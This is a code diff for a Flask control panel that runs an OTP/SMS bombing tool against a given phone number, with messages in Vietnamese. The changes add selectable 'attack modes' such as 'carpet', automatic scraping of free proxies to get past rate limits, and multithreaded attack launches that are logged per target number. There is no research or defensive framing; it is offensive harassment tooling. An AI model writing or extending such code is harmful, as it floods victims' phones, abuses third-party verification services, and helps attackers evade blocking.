@@ -25,9 +25,9 @@ def add_log(message, type="system"):
     if len(LOG_MESSAGES) > MAX_LOGS:
         LOG_MESSAGES.pop(0)
 
-def spam_loop_task(phone, delay, proxies):
+def spam_loop_task(phone, delay, proxies, attack_mode='carpet'):
     global SPAM_RUNNING, STATS
-    spam_instance = spam_otp.SpamOTP(phone, proxies=proxies)
+    spam_instance = spam_otp.SpamOTP(phone, proxies=proxies, attack_mode=attack_mode)
     
     # Custom logger to capture logs and stats
     def custom_log(msg):
@@ -88,6 +88,8 @@ def start_spam():
     delay = float(data.get('delay', 2.0))
     thread_count = int(data.get('threads', 1))
     proxies_raw = data.get('proxies', '')
+    attack_mode = data.get('mode', 'carpet') # New: Attack Mode
+    auto_proxy = data.get('auto_proxy', False) # New: Auto Proxy
     
     if not phone or len(phone) < 10:
         return jsonify({'status': 'error', 'message': 'Số điện thoại không hợp lệ'}), 400
@@ -95,8 +97,15 @@ def start_spam():
     if SPAM_RUNNING:
         return jsonify({'status': 'error', 'message': 'Đang chạy spam rồi!'}), 400
 
-    # Parse Proxies
-    proxies = [p.strip() for p in proxies_raw.split('\n') if p.strip()] if proxies_raw else []
+    # Proxy Handling
+    proxies = []
+    if auto_proxy:
+        import proxy_scraper
+        scraper = proxy_scraper.ProxyScraper()
+        proxies = scraper.get_proxies()
+        add_log(f"Auto-Scraped {len(proxies)} proxies from internet.", "system")
+    elif proxies_raw:
+        proxies = [p.strip() for p in proxies_raw.split('\n') if p.strip()]
 
     # Reset stats on new run
     STATS = {"sent": 0, "success": 0, "fail": 0, "threads": thread_count}
@@ -105,13 +114,14 @@ def start_spam():
     SPAM_THREADS = []
     
     for i in range(thread_count):
-        t = threading.Thread(target=spam_loop_task, args=(phone, delay, proxies))
+        # Pass attack_mode to spam_loop via args or modify spam_loop_task
+        t = threading.Thread(target=spam_loop_task, args=(phone, delay, proxies, attack_mode))
         t.daemon = True
         t.start()
         SPAM_THREADS.append(t)
     
-    add_log(f"Started attack on {phone} | Threads: {thread_count} | Proxies: {len(proxies)}", "system")
-    return jsonify({'status': 'success', 'message': f'Đã kích hoạt {thread_count} luồng tấn công!'})
+    add_log(f"Started attack on {phone} | Mode: {attack_mode.upper()} | Threads: {thread_count}", "system")
+    return jsonify({'status': 'success', 'message': f'Đã kích hoạt {thread_count} luồng mode {attack_mode.upper()}!'})
 
 @app.route('/api/stop', methods=['POST'])
 def stop_spam():
